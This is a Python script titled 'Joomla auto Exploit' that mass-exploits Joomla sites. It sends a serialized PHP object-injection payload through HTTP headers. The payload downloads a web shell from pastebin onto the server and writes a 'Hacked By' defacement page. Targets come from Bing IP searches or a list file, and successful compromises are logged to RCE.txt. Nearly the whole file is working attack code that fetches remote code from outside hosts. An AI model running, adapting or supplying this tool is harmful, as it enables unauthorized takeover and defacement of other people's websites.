import re , urllib2  , sys , os, requests
from platform import system
from time import sleep
from threading import Thread
import time

W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
BL = '\033[31M'
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)
def timer():
    now = time.localtime(time.time())
    return time.asctime(now)

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
site = []
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/shell.php','w+'),file_get_contents('https://pastebin.com/raw/s6uX2Uhf')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("http://pastebin.com/raw/Q1aM9w16"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/ind.html','w+'),' Hacked By Pro Huss_x ');"""

class Jmbrute(object) :
  """
  Class to brute force joomla
  """
  def __init__(self, website, timeout=10) :
    self.website = website
    # Making a requests sesion object
    self.req = requests.session()
    self.timeout = timeout

  def __makeGet(self, url) :
    try :
      return self.req.get(url, timeout=self.timeout).text
    except :
      pass

  def getToken(self) :
    try :
      return re.search('<input type="hidden" name="(.*?)" value="1" />', self.__makeGet(self.website)).group(1)
    except :
      return False
def prepare(url, ua):
    try:
        global user_agent
        headers = {
            'User-Agent' : user_agent,
            'x-forwarded-for' : ua
        }
        cookies = urllib2.Request(url, headers=headers)
        result = urllib2.urlopen(cookies)
        cookieJar = result.info().getheader('Set-Cookie')
        injection = urllib2.Request(url, headers=headers)
        injection.add_header('Cookie', cookieJar)
        urllib2.urlopen(injection)
    except:
        pass
def toCharCode(string):
    try:
        encoded = ""
        for char in string:
            encoded += "chr({0}).".format(ord(char))
        return encoded[:-1]
    except:
        pass
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
def rce(url):
    try:
        global payload
        payload_generated = generate(payload)
        prepare(url, payload_generated)
        tester = urllib2.urlopen(url+"/shell.php").read()
        la = requests.get(url+"/ind.html")
        if re.findall("Tryag", tester) and urllib2.urlopen(url+"/shell.php").getcode() == 200 and "Hacked" in la.content:
            site = url + "/shell.php"
            site2 = url + "/ind.html"
            print O+("[+]=>> %s [ ok ]" %  site)
            print (O+"\n[+]=>> %s [ ok ]" %  site2)
            with open("RCE.txt", "a") as f:
                f.write("\n")
                f.write(O+"[+]=>> %s [ ok ]" %  site)
                f.write("\n")
                f.write(O+"[+]=>> %s [ ok ]" %  site2)
                f.write("\n")
    except:
        pass
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]

print G+"\n\t                 Joomla auto Exploit "
slowprint (R+"\n\t                 Coded By "+O+"./Scan"+O)
print W+"                  Fuck & Fuck"

def test(url):
    try:
        openbing = urllib2.urlopen(url)
        readbing = openbing.read()
        req = requests.get(url)
        if re.findall("Joomla", readbing) or "Joomla" in req.text or urllib2.urlopen(url+"/administrator").getcode() == 200:
            print G+"[!]->  Scanning : " +  url
            print "\nExploit RCE : \n"
            rce(url)
        else:
            pass
    except:
        pass
def grabber(s):
    global site
    xxxx = []
    page = 1
    while page <= 101:
        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
        openbing = urllib2.urlopen(bing)
        readbing = openbing.read()
        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
        for i in range(len(findwebs)):
            allnoclean = findwebs[i]
            findall1 = re.findall('http://(.*?)/', allnoclean)
            for idx, item in enumerate(findall1):
                if 'www' not in item:
                    findall1[idx] = 'http://www.' + item + '/'
                else:
                    findall1[idx] = 'http://' + item + '/'
            xxxx.extend(findall1)
        page = page + 10
    final = unique(xxxx)
    site.extend(final)
def main():
    print "\r\n1 >>\tExploit From Server IP\n2 >> \tExploit From list\n"
    c = raw_input("What Do You Want >> ")
    if c == '1':
        ip = raw_input('[+] Enter Server IP : ')
        try:
            print G+"\n\t                 Joomla auto Exploit "
            slowprint (R+"\n\t                 Coded By "+O+"./Scan"+O)
            print W+"                  Fuck & Fuck"

            grabber(str(ip))
            for _site in site:
                test(_site)
        except:
            pass
    elif c == '2':
            list = raw_input('[+] Enter List Name : ')
            try:
                file = open(list).readlines()
                print  G+"\n\t                 Joomla auto Exploit "
                slowprint (R+"\n\t                 Coded By "+O+"./Scan"+O)
                print W+"                  Fuck & Fuck"

                if (len(file) > 0):
                    for attack in file:
                        _attack = attack.rstrip()
                        test(_attack)
            except:
                pass
            else:
                pass
if __name__ == '__main__':
    main()